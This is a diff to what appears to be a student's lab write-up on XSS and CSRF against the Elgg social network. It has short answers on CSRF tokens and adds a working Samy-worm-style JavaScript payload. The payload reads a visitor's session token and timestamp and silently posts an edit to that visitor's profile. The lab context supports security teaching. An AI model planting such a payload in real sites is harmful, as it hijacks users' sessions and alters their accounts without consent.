@@ -36,4 +36,34 @@ Alice's account automatically sent the request: (When refresh, the button automa
 Answer: The website contains countermeasures regarding the CSRF attack. The token and the timestamp are used as a verification of user's status. Therefore, the two lines are used to directly extract the CSRF token and timestamp to the variable to use them easily. 
 2.  If the Elgg application only provides the Rich Text Editor mode for the "About Me" field, i.e., you cannot switch to the Text mode (“Edit HTML”), can you still launch a successful attack?
 Answer: Yes. Usually, the Rich Text Editor contains safety measures to clear the malicious input. They usually intend to delete HTML tags inside the user input. However, we can directly modify the content in the input tag to avoid the additional verification. 
+# Task 3
+##
 
+```
+<script type="text/javascript">
+window.onload = function(){
+//JavaScript code to access user name, user guid, Time Stamp
+__elgg_ts
+//and Security Token __elgg_token
+var userName="&name="+elgg.session.user.name;
+var guid="&guid="+elgg.session.user.guid;
+var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
+var token="&__elgg_token="+elgg.security.token.__elgg_token;
+//Construct the content of your url.
+var content="&description=<p>samy is my
+hero</p>"+ts+token+userName+guid; //FILL IN
+var samyGuid=59; //FILL IN
+var sendurl="http://www.seed-server.com/action/profile/edit"; 
+if(elgg.session.user.guid!=samyGuid)
+{
+//Create and send Ajax request to modify profile
+var Ajax=null;
+Ajax=new XMLHttpRequest();
+Ajax.open("POST", sendurl, true);
+Ajax.setRequestHeader("Content-Type",
+"application/x-www-form-urlencoded");
+Ajax.send(content);
+}
+}
+</script>
+```
